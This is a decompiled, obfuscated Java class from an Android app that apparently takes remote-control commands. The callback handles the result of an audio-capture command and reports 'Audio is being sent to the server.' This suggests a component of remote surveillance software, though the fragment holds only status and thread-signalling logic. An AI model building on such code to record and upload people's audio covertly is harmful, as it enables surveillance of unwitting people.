package com.vvt.appengine.a;

import android.os.ConditionVariable;
import android.os.Looper;
import com.vvt.a.c;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.io.File;

class u
  implements c
{
  u(q paramq) {}
  
  public void a(String paramString)
  {
    boolean bool = q.a();
    if (bool) {}
    Object localObject = this.a;
    String str = q.d(this.a);
    q.a((q)localObject, str);
    localObject = q.b(this.a);
    str = null;
    ((RmtCtrlOutputStatusMessage)localObject).setSuccess(false);
    q.b(this.a).setMessage(paramString);
    localObject = q.e(this.a);
    if (localObject != null)
    {
      localObject = q.e(this.a);
      ((Looper)localObject).quit();
    }
    localObject = q.c(this.a);
    if (localObject != null)
    {
      localObject = q.c(this.a);
      ((ConditionVariable)localObject).open();
    }
  }
  
  public void b(String paramString)
  {
    int i = 1;
    boolean bool = q.b();
    if (bool) {}
    Object localObject1 = this.a;
    Object localObject2 = q.d(this.a);
    q.a((q)localObject1, (String)localObject2);
    localObject1 = this.a;
    localObject2 = q.f(this.a);
    Object localObject3 = q.g(this.a);
    localObject1 = q.a((q)localObject1, (String)localObject2, (String)localObject3);
    if (localObject1 != null)
    {
      int k = localObject1.length;
      if (k > i)
      {
        localObject2 = this.a;
        localObject3 = q.g(this.a);
        String str = q.d(this.a);
        paramString = q.a((q)localObject2, (String)localObject3, str, (File[])localObject1);
      }
    }
    int j = q.b(this.a, paramString);
    long l = j;
    localObject3 = this.a;
    q.a((q)localObject3, paramString, l);
    q.b(this.a).setSuccess(i);
    localObject1 = q.b(this.a);
    localObject2 = "Audio is being sent to the server.";
    ((RmtCtrlOutputStatusMessage)localObject1).setMessage((String)localObject2);
    localObject1 = q.e(this.a);
    if (localObject1 != null)
    {
      localObject1 = q.e(this.a);
      ((Looper)localObject1).quit();
    }
    localObject1 = q.c(this.a);
    if (localObject1 != null)
    {
      localObject1 = q.c(this.a);
      ((ConditionVariable)localObject1).open();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/u.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */